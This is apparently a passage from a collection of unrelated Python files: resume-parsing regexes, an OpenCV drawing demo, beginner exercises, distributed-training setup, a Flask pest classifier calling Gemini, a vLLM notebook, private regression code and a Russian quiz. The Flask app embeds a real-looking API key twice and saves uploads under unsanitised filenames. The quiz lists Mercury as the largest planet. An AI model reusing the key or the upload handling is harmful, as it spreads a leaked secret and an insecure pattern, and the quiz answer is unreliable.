'\u7b2c\u56db\u519b\u533b\u5927\u5b66', '\u5170\u5dde\u5927\u5b66', '\u9752\u6d77\u5927\u5b66', '\u5b81\u590f\u5927\u5b66', '\u65b0\u7586\u5927\u5b66', '\u77f3\u6cb3\u5b50\u5927\u5b66']\n\n\ndef province():\n    return ['\u5317\u4eac', '\u5929\u6d25', '\u6cb3\u5317', '\u5c71\u897f', '\u5185\u8499\u53e4', '\u8fbd\u5b81', '\u5409\u6797', '\u9ed1\u9f99\u6c5f', '\u4e0a\u6d77', '\u6c5f\u82cf', '\u6d59\u6c5f', '\u5b89\u5fbd', '\u798f\u5efa', '\u6c5f\u897f', '\u5c71\u4e1c', '\u6cb3\u5357', '\u6e56\u5317', '\u6e56\u5357', '\u5e7f\u4e1c', '\u5e7f\u897f', '\u6d77\u5357', '\u91cd\u5e86', '\u56db\u5ddd', '\u8d35\u5dde', '\u4e91\u5357', '\u897f\u85cf', '\u9655\u897f', '\u7518\u8083', '\u9752\u6d77', '\u5b81\u590f', '\u65b0\u7586', '\u53f0\u6e7e', '\u9999\u6e2f', '\u6fb3\u95e8']\n\n\ndef tel_pattern():\n    return r'1[3-9]\\d{1}[\\s|-]?\\d{4}[\\s|-]?\\d{4}'\n\n\ndef email_pattern():\n    return r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}'\n\n\ndef chinese_str():\n    return r'^[\\u4e00-\\u9fa5]{2,4}$'\n\n\ndef birth_pattern():\n    return (r'((19\\d{2}|200[0-7])[-./\u5e74\\s]((1[0-2])|(0?[1-9]))[-./\u6708\\s](([12]\\d)|(3[01])|(0?[1-9]))\u65e5?)|(19\\d{2}|200['\n            r'0-7])[-./\u5e74\\s]((1[0-2])|(0?[1-9]))[-./\u6708\\s]?')\n\n\ndef age_pattern():\n    return r'\u5e74\u9f84[:\uff1a ](\\d{2})\u5c81?|\\b(\\d{2})\u5c81\\b'\n\n\ndef edu_pattern():\n    return r'\u5c0f\u5b66|\u521d\u4e2d|\u9ad8\u4e2d|\u4e2d\u4e13|\u5927\u4e13|\u672c\u79d1|\u5b66\u58eb|\u7855\u58eb|\u535a\u58eb'\n\n\ndef edu_map():\n    return {'': 0, '\u5c0f\u5b66': 1, '\u521d\u4e2d': 2, '\u4e2d\u4e13': 3, '\u9ad8\u4e2d': 4, '\u5927\u4e13': 5, '\u672c\u79d1': 6, '\u5b66\u58eb': 7, '\u7855\u58eb': 8, '\u535a\u58eb': 9}\n\n\ndef self_ability():\n    return [['CET-6', '\u82f1\u8bed\u56db/\u516d\u7ea7', '\u82f1\u8bed\u516d\u7ea7', 'CET6', 'CET-4/6'], ['CET-4', 'CET4', '\u82f1\u8bed\u56db\u7ea7'], ['PS', 'PhotoShop', 'Photoshop', 'photoshop', 'PHOTOSHOP', 'Ps'], ['Office', 'office', 'Word', 'word', 'PPT', 'ppt', 'PowerPoint', 'EXCEL', 'excel'], ['\u8ba1\u7b97\u673a\u4e8c\u7ea7', '\u8ba1\u7b97\u673a\u4e00\u7ea7', '\u8ba1\u7b97\u673a\u7b49\u7ea7']]\n\n\ndef company_endword():\n    return ['\u516c\u53f8', '\u6559\u80b2', '\u96c6\u56e2', '\u8fde\u9501', '\u534f\u4f1a', '\u4f1a\u6240', '\u56fd\u9645', '\u533b\u9662', '\u5382', '\u5c40', '\u79d1\u6280', '\u57fa\u5730', '\u5e97', '\u9662', '\u6821', '\u6240', '\u4e2d\u5fc3', '\u7f51\u7edc', '\u5ba4', '\u94f6\u884c', '\u9879\u76ee\u7ec4', '\u7814\u7a76\u4f1a']\n\n\ndef college_endword():\n    return ['\u9662', '\u6821', '\u5b66', '\u6240', '\u90e8']\n\n\ndef score_map():\n    return {'': 0, '\u5c0f\u5b66': 0, '\u521d\u4e2d': 0, '\u4e2d\u4e13': 3, '\u9ad8\u4e2d': 6, '\u5927\u4e13': 10, '\u672c\u79d1': 13, '\u5b66\u58eb': 13, '\u7855\u58eb': 17, '\u535a\u58eb': 21, 'CET4': 1, 'CET6': 2, 'NCRE': 1, '211': 3, '985': 5}\n\n\ndef job_obj_keywords():\n    return ['\u6c42\u804c\u610f\u5411', '\u5e94\u8058\u5c97\u4f4d', '\u6c42\u804c\u5c97\u4f4d', '\u5e94\u8058\u610f\u5411', '\u5e94\u8058\u804c\u4f4d']\n\n\ndef work_time():\n    return (r'(\\d{4}(?:\\.\\d{1,2}|\u5e74\\d{1,2}|\u5e74|\u5e74\\d{1,2}\u6708)?)\\s*[ -\u81f3]\\s*(\\d{4}(?:\\.\\d{1,2}|\u5e74\\d{1,2}|\u5e74|\u5e74\\d{1,2}|\u5e74\\d{1,'\n            r'2}\u6708)?|\u4eca|\u81f3\u4eca)')\n\n\ndef job_fit():\n    # [<\u5c97\u4f4d\u540d\u79f0>, <\u6700\u4f4e\u5b66\u5386\u8981\u6c42>, <\u6700\u4f4e\u5de5\u4f5c\u5e74\u9650>, <\u662f\u5426\u8981\u6c42office\u80fd\u529b>, <\u6700\u4f4e\u5e74\u9f84\u8981\u6c42>]\n    return {0: ['\u6682\u65e0', '', -1, False, -1], 1: ['\u4ea7\u54c1\u8fd0\u8425', '', 2, False, -1], 2: ['\u5e73\u9762\u8bbe\u8ba1\u5e08', '\u5927\u4e13', 1, False, -1], 3: ['\u8d22\u52a1', '\u672c\u79d1', -1, False, -1],\n            4: ['\u5e02\u573a\u8425\u9500', '\u672c\u79d1', 10, True, -1], 5: ['\u9879\u76ee\u4e3b\u7ba1', '\u672c\u79d1', 3, True, -1], 6: ['\u5f00\u53d1\u5de5\u7a0b\u5e08', '\u672c\u79d1', 3, False, -1], 7: ['\u6587\u5458', '\u5927\u4e13', 1, True, 25],\n            8: ['\u7535\u5546\u8fd0\u8425', '', 2, False, -1], 9: ['\u4eba\u529b\u8d44\u6e90\u7ba1\u7406', '\u5927\u4e13', 2, False, -1], 10: ['\u98ce\u63a7\u4e13\u5458', '\u7855\u58eb', 5, False, -1]}\n",
    "import cv2\nimport math\n\nsource = cv2.imread(\"/home/ankan_opencv/officework/indore-talk24-projects/Playing-with-Your-Mouse-With-OpenCV/dog.jpg\", 1)\nsource = cv2.resize(source, (680, 680))\n# /home/ankan_opencv/\n# Lists to store the points\ncenter = []\ncircumference = []\n\n\ndef drawCircle(action, x, y, flags, userdata):\n    # Referencing global variables\n    global center, circumference\n    # Action to be taken when left mouse button is pressed\n    if action == cv2.EVENT_LBUTTONDOWN:\n        center = [(x, y)]\n        # Mark the center\n        cv2.circle(source, center[0], 1, (255, 255, 0), 2, cv2.LINE_AA)\n\n        # Action to be taken when left mouse button is released\n    elif action == cv2.EVENT_LBUTTONUP:\n        circumference = [(x, y)]\n        # Calculate radius of the circle\n        radius = math.sqrt(\n            math.pow(center[0][0] - circumference[0][0], 2) + math.pow(center[0][1] - circumference[0][1], 2)\n        )\n        # Draw the circle\n        cv2.circle(source, center[0], int(radius), (0, 255, 0), 2, cv2.LINE_AA)\n        cv2.imshow(\"Window\", source)\n\n\n# Make a dummy image, will be useful to clear the drawing\ndummy = source.copy()\ncv2.namedWindow(\"Window\")\n# highgui function called when mouse events occur\ncv2.setMouseCallback(\"Window\", drawCircle)\nk = 0\n# loop until escape character is pressed\nwhile k != 27:\n\n    cv2.imshow(\"Window\", source)\n    cv2.putText(\n        source,\n        \"\"\"Choose center, and drag, Press ESC to exit and c to clear\"\"\",\n        (10, 30),\n        cv2.FONT_HERSHEY_SIMPLEX,\n        0.6,\n        (255, 255, 255),\n    )\n    k = cv2.waitKey(20) & 0xFF\n    # Another way of cloning, key low_c\n    if k == 99:\n        source = dummy.copy()\n\n\ncv2.destroyAllWindows()\n",
    "#write a function that checks whether a string is a palindrome\ndef is_palindrome(s):\n    new_s = s [::-1]\n    if new_s == s:\n        return \"is a palindrome\"\n    else:\n        return \"is not a palindrome\"\n\nprint(is_palindrome(\"hello\"))\nprint(is_palindrome(\"ollo\"))\n\n#write program where for multiples of three, it'll print out fizz. for multiples of 5, it'll print out buzz. for multiples of both\n#3 and 5 it'll print out fizzbuzz\nfor i in range (1, 101):\n    if i % 3 == 0 and i % 5 == 0:\n        print(\"fizzbuzz\")\n    elif i % 3 == 0:\n        print(\"fizz\")\n    elif i % 5 == 0:\n        print(\"buzz\")\n    else:\n        print(i)\n\n#write a function that takes a list of numbers and returns the largest number without using max()\ndef find_max(numbers):\n    numbers.sort()\n    return numbers[-1]\n\nprint(find_max([1,2,3]))\nprint(find_max([-10,-2,-3]))\n\n# implement linear search algorithm to find given element in list and return its index, if not in list return -1\ndef linear_search(list, target):\n    for i in range(0, len(list)):\n        if list[i] == target:\n            return i\n    return -1\n    \nprint(linear_search([1,4,5,2,7], 5))\nprint(linear_search([1,4,5,2,7], 3))\n\n#implement binary search algorithm to find position of the selected element in a sorted list\ndef binary_search(sorted_list, target):\n    begin = 0\n    end = len(sorted_list) - 1\n\n    while begin <= end:\n        mid = (begin + end) // 2\n        if sorted_list[mid] == target:\n            return mid\n        elif sorted_list[mid] < target:\n            begin = mid + 1\n        else:\n            end = mid - 1\n    return - 1        \n\nprint(binary_search([1,2,3,4,5], 3))\nprint(binary_search([1,2,3,4,5], 6))\n\n#implement bubble sort to sort a list of numbers in ascending order\ndef bubble_sort(list):\n    for i in range (len(list)):\n        switch = False\n        for j in range (0, len(list) - i - 1):\n            if list[j] > list[j+1]:\n                list[j], list[j+1] = list[j+1], list[j]\n                switch = True\n        if switch == False:\n            break\n    return list\n\nprint(bubble_sort([5,3,2,4,1]))\n\n#write a function to calculate the factorial of a non-negative integer using an iterative method\ndef factorial(n):\n    product = 1\n    for i in range(n):\n        product = product * (i+1)\n    return product\n\nprint(factorial(5))\n\n#create a function to check if n is prime\ndef is_prime(n):\n    if n < 2:\n        return False\n    for i in range(2, n):\n        if (n % i) == 0:\n            return False\n    return True\n    \nprint(is_prime(7))\n\n#write a function that generates the first \"n\" fibonnaci numbers using iterative approach       \ndef fibonacci(n):\n    if n == 0:\n        return False\n    elif n == 1: \n        return 0\n    else:\n        list = [0, 1]\n        for i in range(2, n):\n            list.append(list[i-1] + list[i-2])\n        return list\n\nprint(fibonacci(10))",
    "# Copyright (c) Meta Platforms, Inc. and affiliates. All Rights Reserved.\n#\n# This source code is licensed under the MIT license found in the\n# LICENSE file in the root directory of this source tree.\n\nimport io\nimport logging\nimport os\nimport pickle\nimport random\nimport signal\nimport socket\nimport struct\nimport subprocess\nfrom argparse import Namespace\nfrom collections import OrderedDict\nfrom dataclasses import dataclass\nfrom typing import Any, Dict, List, Mapping, Optional\n\nimport torch\nimport torch.distributed as dist\nfrom omegaconf import open_dict\n\nfrom metaseq.dataclass.configs import DistributedTrainingConfig, MetaseqConfig\n\nlogger = logging.getLogger(__name__)\n\n# Flag to indicate if we're using Megatron\n# NOTE: this is a temporary hack until we move away from Megatron's model parallel init\n_USE_MEGATRON = False\n\n\ndef is_master(cfg: DistributedTrainingConfig):\n    return cfg.distributed_rank == 0\n\n\ndef infer_init_method(cfg: DistributedTrainingConfig, force_distributed=False):\n    if cfg.distributed_init_method is not None:\n        return\n\n    if cfg.distributed_port > 0:\n        # we can determine the init method automatically for Slurm\n        _infer_slurm_init(cfg)\n    elif all(\n        key in os.environ\n        for key in [\"MASTER_ADDR\", \"MASTER_PORT\", \"WORLD_SIZE\", \"RANK\", \"LOCAL_RANK\"]\n    ):\n        # support torch.distributed.launch\n        _infer_torch_distributed_launch_init(cfg)\n    elif cfg.distributed_world_size > 1 or force_distributed:\n        # fallback for single node with multiple GPUs\n        _infer_single_node_init(cfg)\n\n    if not cfg.distributed_no_spawn:\n        with open_dict(cfg):\n            cfg.distributed_num_procs = min(\n                torch.cuda.device_count(), cfg.distributed_world_size\n            )\n\n\ndef _infer_torch_distributed_launch_init(cfg: DistributedTrainingConfig):\n    cfg.distributed_init_method = \"env://\"\n    cfg.distributed_world_size = int(os.environ[\"WORLD_SIZE\"])\n    cfg.distributed_rank = int(os.environ[\"RANK\"])\n    cfg.device_id = int(os.environ[\"LOCAL_RANK\"])\n    # processes are created by torch.distributed.launch\n    cfg.distributed_no_spawn = True\n\n\ndef _infer_slurm_init(cfg: DistributedTrainingConfig):\n    node_list = os.environ.get(\"SLURM_STEP_NODELIST\")\n    if node_list is None:\n        node_list = os.environ.get(\"SLURM_JOB_NODELIST\")\n    if node_list is not None:\n        try:\n            hostnames = subprocess.check_output(\n                [\"scontrol\", \"show\", \"hostnames\", node_list]\n            )\n            host = hostnames.split()[0].decode(\"utf-8\")\n        except subprocess.CalledProcessError as e:  # scontrol failed\n            raise e\n        except FileNotFoundError:  # Slurm is not installed\n            # if we're in a container, then maybe MASTER_ADDR is set\n            host = os.environ.get(\"MASTER_ADDR\", None)\n        if host is None:\n            return\n        cfg.distributed_init_method = \"barrierlesstcpr://{host}:{port}\".format(\n            host=host, port=cfg.distributed_port\n        )\n        nnodes = int(os.environ.get(\"SLURM_NNODES\"))\n        ntasks_per_node = os.environ.get(\"SLURM_NTASKS_PER_NODE\")\n        if ntasks_per_node is not None:\n            ntasks_per_node = int(ntasks_per_node)\n        else:\n            ntasks = int(os.environ.get(\"SLURM_NTASKS\"))\n            nnodes = int(os.environ.get(\"SLURM_NNODES\"))\n            assert ntasks % nnodes == 0\n            ntasks_per_node = int(ntasks / nnodes)\n        if ntasks_per_node == 1:\n            gpus_per_node = torch.cuda.device_count()\n            node_id = int(os.environ.get(\"SLURM_NODEID\"))\n            cfg.distributed_rank = node_id * gpus_per_node\n            cfg.distributed_world_size = nnodes * gpus_per_node\n        else:\n            assert ntasks_per_node == torch.cuda.device_count()\n            cfg.distributed_world_size = ntasks_per_node * nnodes\n            cfg.distributed_no_spawn = True\n            cfg.distributed_rank = int(os.environ.get(\"SLURM_PROCID\"))\n            cfg.device_id = int(os.environ.get(\"SLURM_LOCALID\"))\n\n\ndef _infer_single_node_init(cfg: DistributedTrainingConfig):\n    assert (\n        cfg.distributed_world_size <= torch.cuda.device_count()\n    ), f\"world size is {cfg.distributed_world_size} but have {torch.cuda.device_count()} available devices\"\n    port = random.randint(10000, 20000)\n    cfg.distributed_init_method = \"tcp://localhost:{port}\".format(port=port)\n\n\ndef distributed_init(cfg: MetaseqConfig):\n    if isinstance(cfg, Namespace):\n        from metaseq.dataclass.utils import convert_namespace_to_omegaconf\n\n        cfg = convert_namespace_to_omegaconf(cfg)\n\n    # silence torch's distributed initialization info\n    logging.getLogger(\"torch.distributed.distributed_c10d\").setLevel(logging.WARNING)\n\n    if torch.distributed.is_available() and torch.distributed.is_initialized():\n        logger.warning(\"Distributed is already initialized, cannot initialize twice!\")\n    else:\n        logger.debug(\n            \"distributed init (rank {}): {}\".format",
    "from flask import Flask, render_template, request\nfrom tensorflow.keras.models import load_model\nfrom tensorflow.keras.preprocessing import image\nimport numpy as np\nimport os\nimport google.generativeai as genai\n\napp = Flask(__name__)\n\n# Load the trained machine learning model\nmodel = load_model('insect_model1.h5')\n\n# Define class names\nclass_names = [\n    'Africanized Honey Bees (Killer Bees)',\n    'Aphids',\n    'Armyworms',\n    'Brown Marmorated Stink Bugs',\n    'Cabbage Loopers',\n    'Citrus Canker',\n    'Colorado Potato Beetles',\n    'Corn Borers',\n    'Corn Earworms',\n    'Fall Armyworms',\n    'Fruit Flies',\n    'Spider Mites',\n    'Thrips',\n    'Tomato Hornworms',\n    'Western Corn Rootworms'\n]\n\n# Create a dictionary to map numeric index to class names\nindex_to_class = {i: class_name for i, class_name in enumerate(class_names)}\n\n# Function to preprocess image data\ndef preprocess_image(img):\n    # Preprocess the image as required by your model\n    img = image.load_img(img, target_size=(224, 224))  # Resize the image to match input shape\n    img = image.img_to_array(img)\n    img = img / 255.0  # Normalize pixel values\n    img = np.expand_dims(img, axis=0)  # Add batch dimension\n    return img\n\n@app.route('/')\ndef home():\n    return render_template('home.html')\n\n@app.route('/predict', methods=['POST','GET'])\ndef predict():\n    if 'image' not in request.files:\n        return render_template('prediction.html', error='No file part')\n\n    img_file = request.files['image']\n    \n    if img_file.filename == '':\n        return render_template('prediction.html', error='No selected file')\n\n    img_path = os.path.join('static', 'uploads', img_file.filename)\n    img_file.save(img_path)\n\n    if not os.path.exists(img_path):\n        return render_template('prediction.html', error='Failed to save the uploaded image.')\n\n    processed_img = preprocess_image(img_path)\n    prediction = model.predict(processed_img)\n    \n    predicted_index = np.argmax(prediction)\n    predicted_class = index_to_class.get(predicted_index, \"Unknown\")\n\n    genai.configure(api_key=\"AIzaSyA6Bkhpmh6MY2-whmHejhRUsnA286YsExI\")\n    generation_config = {\n            \"temperature\": 0.9,\n            \"top_p\": 1,\n            \"top_k\": 1,\n            \"max_output_tokens\": 2048,\n        }\n    \n    safety_settings = [\n            {\n                \"category\": \"HARM_CATEGORY_HARASSMENT\",\n                \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n            },\n            {\n                \"category\": \"HARM_CATEGORY_HATE_SPEECH\",\n                \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n            },\n            {\n                \"category\": \"HARM_CATEGORY_SEXUALLY_EXPLICIT\",\n                \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n            },\n            {\n                \"category\": \"HARM_CATEGORY_DANGEROUS_CONTENT\",\n                \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n            },\n        ]\n    model1 = genai.GenerativeModel(model_name=\"gemini-1.0-pro\",\n                                      generation_config=generation_config,\n                                      safety_settings=safety_settings)\n    user_prompt = f\"can you give more details about {predicted_class} in 100 words?\"\n    convo = model1.start_chat(history=[\n  {\n    \"role\": \"user\",\n    \"parts\": [\"car\"]\n  },\n  {\n    \"role\": \"model\",\n    \"parts\": [\"**Noun**\\n\\n1. A motor vehicle with four wheels, an engine that powers it, and seats for one to eight people.\\n2. A railway carriage for passengers.\\n3. A cable car or funicular railway.\\n4. (informal) A stolen vehicle.\\n\\n**Verb**\\n\\n1. To transport or drive (someone or something) in a car.\\n2. (slang) To steal (a car).\\n\\n**Examples**\\n\\n1. We drove to the beach in my new car.\\n2. The car was parked illegally.\\n3. The car was stolen from the driveway.\\n4. The thief was arrested for car theft.\\n\\n**Synonyms**\\n\\n* Automobile\\n* Vehicle\\n* Motor car\\n* Coach\\n* Saloon\\n* Sedan\\n* Coupe\\n* Hatchback\\n* Estate car\\n* Station wagon\\n* SUV\\n* Crossover\"]\n  },\n])\n\n        # Send the user query and receive the response\n    convo.send_message(user_prompt)\n    details=convo.last.text\n    print(convo.last.text)\n\n    \n\n    return render_template('prediction_result.html', prediction=predicted_class,details=details)\n\n@app.route('/solution', methods=['POST', 'GET'])\ndef solution():\n    if request.method == 'POST':\n        pest = request.form['pest']\n        \n        # Configure the API key for authentication\n        genai.configure(api_key=\"AIzaSyA6Bkhpmh6MY2-whmHejhRUsnA286YsExI\")\n\n        # Set up the model\n        generation_config = {\n            \"temperature\": 0.9,\n            \"top_p\": 1,\n            \"top_k\": 1,\n            \"max_output_tokens\": 2048,\n        }\n\n        safety_settings = [\n            {\n                \"category\": \"HARM_CATEGORY_HARASSMENT\",\n                \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n            },\n            {\n                \"category\": \"HARM_CATEGORY_HATE_SPEECH\",\n                \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"\n            },\n      ",
    "# Databricks notebook source\n# MAGIC %pip install 'vllm==0.3.0'\n# MAGIC dbutils.library.restartPython()\n\n# COMMAND ----------\n\nnum_gpus = 2\n\n# COMMAND ----------\n\nfrom utils.uc_helpers import stage_registered_model\n\nmodel_staged_path = stage_registered_model(\n  catalog=\"databricks_llama_2_models\",\n  schema=\"models\",\n  # model_name=\"llama_2_7b_chat_hf\",\n  model_name=\"llama_2_70b_chat_hf\",\n  version=3,\n  local_base_path=\"/local_disk0/models\",\n  overwrite=False # if this is false it will use what ever is there existing\n)\n\n# COMMAND ----------\n\n# MAGIC %md\n# MAGIC\n# MAGIC ## Make fake data and table to simulate source table\n\n# COMMAND ----------\n\nimport random\nimport pandas as pd\nword_list = [\n    \"apple\", \"banana\", \"carrot\", \"dog\", \"elephant\", \n    \"frog\", \"guitar\", \"house\", \"ice cream\", \"jacket\", \n    \"kite\", \"lion\", \"moon\", \"nest\", \"orange\", \n    \"piano\", \"queen\", \"rabbit\", \"snake\", \"tree\"\n]\n\ndef generate_random_questions(word_list, n):\n    questions = []\n    for _ in range(n):\n        question_type = random.choice([\"Spell\", \"Define\"])  # Choose between \"Spell\" or \"Define\"\n        if question_type == \"Spell\":\n            word = random.choice(word_list)\n            questions.append(f\"[INST] <<SYS>>Answer to my quesiton in one sentence! Here is an example: \\n Question: What day is today? Answer: Today is monday! <</SYS>> How do you spell '{word}'?[/INST]\")\n        elif question_type == \"Define\":\n            word = random.choice(word_list)\n            questions.append(f\"[INST] <<SYS>> Answer to my quesiton in one sentence! Here is an example: \\nQuestion: What day is today? Answer: Today is monday!<</SYS>> What is the definition of '{word}'?[/INST]\")\n    return questions\n  \nquestions = generate_random_questions(word_list=word_list, n=100)\n\ndf = spark.createDataFrame(pd.DataFrame({\"text\": questions}))\ndisplay(df)\n\n# COMMAND ----------\n\nmodel_path = str(model_staged_path / \"model\")\ntokenizer_path = str(model_staged_path / \"components/tokenizer\")\nmodel_path, tokenizer_path\n\n# COMMAND ----------\n\nfrom vllm import LLM, SamplingParams\nfrom typing import Iterator\nfrom pyspark.sql.functions import pandas_udf\n\nmodel = LLM(model=model_path,\n            tokenizer=tokenizer_path,\n            tensor_parallel_size=num_gpus)\n\n# COMMAND ----------\n\nparams = SamplingParams( temperature = 0.1 , top_p = 0.6 , max_tokens=150)\n\ndef generate_in_batch(batch: pd.Series) -> pd.Series:\n    responses = []\n    outputs = model.generate(batch.tolist(), params)\n    for output in outputs:\n      responses.append(' '.join([o.text for o in output.outputs]))\n    return pd.Series(responses)\n\ndef chunk_dataframe(df, chunk_size=4096):\n    return [df[i:i + chunk_size] for i in range(0, df.shape[0], chunk_size)]\n\n# Process each chunk\ndef process_chunk(chunk, column_name: str, new_column_name: str):\n    chunk['column_to_process'] = generate_in_batch(chunk[column_name])\n    return chunk\n\npdf = df.toPandas()\ndf_chunks = chunk_dataframe(pdf)\nprocessed_chunks = [process_chunk(chunk, column_name=\"text\", new_column_name=\"generated_text\") for chunk in df_chunks]\nprocessed_pdf = pd.concat(processed_chunks, ignore_index=True)\nprocessed_df = spark.createDataFrame(processed_pdf)\n\n# COMMAND ----------\n\ndisplay(processed_df)\n\n# COMMAND ----------\n\nimport ray\nray.shutdown()\n\n# COMMAND ----------\n\n\n",
    "# Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.\n# SPDX-License-Identifier: Apache-2.0\nimport numpy as np\nimport scipy\nimport scipy.linalg\nfrom scipy.optimize import minimize\nfrom scipy.stats import norm\n\nfrom sklearn import preprocessing\n\n\ndef delta_eps(eps, mu):\n    \"\"\"Delta computation based on mu and epsilon.\n\n     .. math::\n\n        \\begin{aligned}\n            \\delta(\\epsilon) = \\Phi(-\\epsilon / \\mu + \\mu / 2) - \\exp(\\epsilon)\\Phi(-\\epsilon / \\mu - \\mu / 2)\n        \\end{aligned}\n\n\n    Args:\n        mu (float): privacy parameter in Gaussian Differential Privacy\n        eps (float): privacy parameter in Approximate Differential Privacy\n\n    Returns:\n        delta (float): converted delta in Approximate Differential Privacy\n\n    \"\"\"\n    delta = norm.cdf(-eps / mu + mu / 2) - np.exp(eps) * norm.cdf(-eps / mu - mu / 2)\n    return delta\n\ndef convert_ApproxDP_to_GDP(eps: float, delta: float = 1e-6):\n    \"\"\"Convert the privacy parameters eps and delta in Approximate DP to the privacy parameter mu in Gaussian DP\n\n    With the same privacy loss, Gaussian DP allows more interactions with the data than Approximate DP does.\n    The underlying composition over multiple campaigns is done through Gaussian DP.\n\n    Once we receive the total privacy budget in eps provided by a customer, this function converts (eps, delta) pair to mu.\n\n    Args:\n        eps (float): privacy parameter in Approximate Differential Privacy\n        delta (float): privacy parameter in Approximate Differential Privacy\n\n    Returns:\n        mu (float): privacy parameter in Gaussian Differential Privacy\n    \"\"\"\n\n    assert eps > 0\n    assert delta > 0\n\n    res = minimize(\n        fun=lambda mu: (np.log(delta_eps(eps, mu)) - np.log(delta)) ** 2.0,\n        x0=eps,\n        bounds=((delta, None),),\n        tol=delta**2.0,\n        method=\"Nelder-Mead\",\n        options={\"maxiter\": 10000},\n    )\n    mu = res.x\n\n    return mu\n\nclass BoostedAdaSSP:\n    def __init__(\n        self,\n        x_bound=1,\n        y_bound=1,\n        epsilon=1,\n        delta=1e-6,\n        num_iterations=100,\n        shrinkage=\"constant\",\n        random_state=np.random.RandomState(42),\n    ):\n        self.rng = random_state\n        self.x_bound = x_bound\n        self.y_bound = y_bound\n        self.epsilon = epsilon\n        self.delta = delta\n        self.num_iterations = num_iterations\n\n        if shrinkage == \"constant\":\n            self.shrinkage = lambda x: 1\n        if shrinkage == \"1/T\":\n            self.shrinkage = lambda x: 1/x\n        if shrinkage == \"1/T**0.5\":\n            self.shrinkage = lambda x: 1/x ** 0.5\n       \n        self.sigma = convert_ApproxDP_to_GDP(self.epsilon, self.delta)\n\n\n    def clipping_norm(self, X):\n        normalized_X = preprocessing.normalize(X, norm=\"l2\")\n        length_X = np.linalg.norm(X, axis=1, keepdims=True)\n        clipped_X = normalized_X * length_X.clip(min=0, max=self.x_bound)\n\n        return clipped_X\n\n    def noisy_cov(self, XTX):\n        # GM1\n        Z = self.x_bound**2 * self.sigma * self.rng.normal(size=XTX.shape)\n\n        Z_analyzegauss = np.triu(Z) + np.triu(Z, k=1).T\n        hatXTX = XTX + Z_analyzegauss\n        # GM3\n        s = scipy.linalg.eigvalsh(XTX, subset_by_value=(0, np.inf))\n        s = s[::-1]\n\n        lambdamin = s[-1] + self.x_bound**2 * self.sigma * self.rng.normal(size=1)\n        lambdamin_lowerbound = max(0, lambdamin - self.x_bound**2 * self.sigma * 1.96)\n\n        dim = XTX.shape[0]\n        lamb = max(\n            0,\n            np.sqrt(dim) * self.sigma * self.x_bound**2 * 1.96 - lambdamin_lowerbound,\n        )\n\n        return hatXTX + lamb * np.eye(dim)\n\n    def run_AdaSSP(self, hatXTX, XTy):\n        # GM2\n        hatXTy = XTy + self.sigma * self.x_bound * self.y_bound * self.rng.normal(\n            size=XTy.shape\n        )\n        theta_adassp = scipy.linalg.solve(hatXTX, hatXTy, assume_a=\"sym\")\n        return theta_adassp\n\n    def fit(self, X, y):\n        X = self.clipping_norm(X)\n\n        n, dim = X.shape\n\n        XTX = X.T @ X \n\n        hatXTX = self.noisy_cov(XTX)\n\n        ensemble_theta = np.zeros(dim)\n\n        for i in range(self.num_iterations):\n            residual = y - X @ ensemble_theta\n            residual = residual.clip(-self.y_bound, self.y_bound)\n            XTy = X.T @ residual \n\n            theta = self.run_AdaSSP(\n                hatXTX,\n                XTy,\n            )\n\n            shrinkage = self.shrinkage((i+1))\n            ensemble_theta += shrinkage * theta\n\n        self.ensemble_theta = ensemble_theta\n        return self\n\n    def predict(self, X):\n        X = self.clipping_norm(X)\n        return X @ self.ensemble_theta\n",
    "import typing\r\nfrom PyQt5 import QtGui\r\nfrom PyQt5.QtCore import Qt\r\nfrom PyQt5.QtWidgets import (\r\n    QApplication, QWidget, QPushButton, QRadioButton,\r\n    QLabel, QVBoxLayout, QHBoxLayout, QGroupBox, QButtonGroup,\r\n    QMessageBox\r\n)\r\nimport random\r\n\r\n\r\nclass Question:\r\n    def __init__(self, question, right_answer, wrong1, wrong2, wrong3):\r\n        self.question = question\r\n        self.right_answer = right_answer\r\n        self.wrong1 = wrong1\r\n        self.wrong2 = wrong2\r\n        self.wrong3 = wrong3\r\n\r\n\r\nquestions = list()\r\nquestions.append(Question('\u041a\u0430\u043a\u0430\u044f \u043f\u043b\u0430\u043d\u0435\u0442\u0430 \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u0441\u0430\u043c\u043e\u0439 \u0431\u043e\u043b\u044c\u0448\u043e\u0439 \u0432 \u0421\u043e\u043b\u043d\u0435\u0447\u043d\u043e\u0439 \u0441\u0438\u0441\u0442\u0435\u043c\u0435?', '\u041c\u0435\u0440\u043a\u0443\u0440\u0438\u0439', '\u0412\u0435\u043d\u0435\u0440\u0430', '\u0417\u0435\u043c\u043b\u044f', '\u042e\u043f\u0438\u0442\u0435\u0440'))\r\nquestions.append(Question('\u0427\u0442\u043e \u043e\u0437\u043d\u0430\u0447\u0430\u0435\u0442 \u0441\u043b\u043e\u0432\u043e \u201c\u0441\u0430\u043c\u0443\u0440\u0430\u0439\u201d?', '\u041b\u043e\u0432\u043a\u043e\u0441\u0442\u044c', '\u0412\u0435\u0440\u043d\u043e\u0441\u0442\u044c', '\u0427\u0435\u0441\u0442\u044c', '\u0421\u043b\u0430\u0432\u0430'))\r\nquestions.append(Question('\u041a\u0430\u043a \u043d\u0430\u0437\u044b\u0432\u0430\u0435\u0442\u0441\u044f \u0441\u0442\u043e\u043b\u0438\u0446\u0430 \u0418\u0442\u0430\u043b\u0438\u0438?', '\u0420\u0438\u043c', '\u041c\u0438\u043b\u0430\u043d', '\u0422\u0443\u0440\u0438\u043d', '\u0424\u043b\u043e\u0440\u0435\u043d\u0446\u0438\u044f'))\r\nquestions.append(Question('\u041a\u0430\u043a\u043e\u0432\u0430 \u0444\u043e\u0440\u043c\u0443\u043b\u0430 \u0432\u043e\u0434\u044b?', 'H2O', 'O2H', 'H2OH', 'HHO'))\r\nquestions.append(Question('\u041a\u0430\u043a\u0438\u0435 \u0433\u043e\u0440\u044b \u044f\u0432\u043b\u044f\u044e\u0442\u0441\u044f \u0441\u0430\u043c\u044b\u043c\u0438 \u0432\u044b\u0441\u043e\u043a\u0438\u043c\u0438 \u0432 